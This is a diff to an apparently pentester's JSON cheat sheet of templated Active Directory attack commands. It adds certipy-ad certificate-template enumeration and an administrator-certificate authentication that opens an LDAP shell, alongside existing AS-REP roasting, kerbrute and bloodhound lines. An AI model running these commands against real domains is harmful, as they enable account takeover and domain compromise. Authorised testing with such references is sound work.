@@ -8,7 +8,8 @@
       "netexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --shares",
       "netexec smb {{IP}} -u {{USER}} -p '{{PASSWORD}}' --pass-pol'",
       "bloodhound-python -d {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}' -ns {{IP}} -c all",
-      "kerbrute userenum --dc {{IP}} -d {{DOMAIN}} /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt"
+      "kerbrute userenum --dc {{IP}} -d {{DOMAIN}} /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
+      "certipy-ad find -u {{USER}} -p '{{PASSWORD}}' -dn {{DOMAIN}} -dc-ip {{IP}} -vulnerable"
     ],
     "exploitation": [
       "impacket-GetNPUsers {{DOMAIN}}/ -no-pass -usersfile users.txt -dc-ip {{IP}} -format john",
@@ -28,7 +29,9 @@
       "xfreerdp3 /u:{{USER}} /p:'{{PASSWORD}}' /v:{{IP}}"                              
     ],
     "post-exploitation": [
-      "reg.py {{DOMAIN}}/{{USER}}:{{PASSWORD}}@{{IP}} query -keyName HKLM\\SOFTWARE\\"
+      "impacket-reg {{DOMAIN}}/{{USER}}:{{PASSWORD}}@{{IP}} query -keyName HKLM\\SOFTWARE\\",
+      "certipy-ad auth -pfx administrator.pfx -ldap-shell -dc-ip {{IP}}"
+      
     ]
   },
   "web": {
